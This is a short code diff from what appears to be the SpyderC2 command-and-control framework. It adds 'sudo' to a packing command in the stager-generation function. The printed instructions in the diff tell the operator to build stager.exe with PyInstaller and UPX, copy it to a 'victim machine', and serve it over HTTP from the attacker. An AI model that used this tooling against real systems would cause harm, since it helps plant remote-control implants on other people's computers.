@@ -207,7 +207,7 @@ def generate_stager(server_logger):
 
 			print(colored(f"\nexe dumped to {colored(f'<path_to_SpyderC2>/data/shared/tmp/dist/{os_name}','cyan')}. Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
 		else:
-			print(colored("\nPlease run the following command: "+ colored('sudo docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-'+os_name + ' && ' + '../../utilities/upx/upx ../tmp/dist/'+os_name+'/stager.exe','cyan')+" in "+colored('<path_to_SpyderC2>/data/shared/tmp','blue')+" directory on the host machine.\n The stager will be generated in "+ colored('<path_to_SpyderC2>/data/shared/tmp/dist/'+os_name,'blue')+".\nCopy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe on victim."))
+			print(colored("\nPlease run the following command: "+ colored('sudo docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-'+os_name + ' && ' + 'sudo ../../utilities/upx/upx ../tmp/dist/'+os_name+'/stager.exe','cyan')+" in "+colored('<path_to_SpyderC2>/data/shared/tmp','blue')+" directory on the host machine.\n The stager will be generated in "+ colored('<path_to_SpyderC2>/data/shared/tmp/dist/'+os_name,'blue')+".\nCopy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe on victim."))
 	except subprocess.CalledProcessError as grepexc:                                                                                                   
 		print(colored(f"exe generation failed ","red"))
 
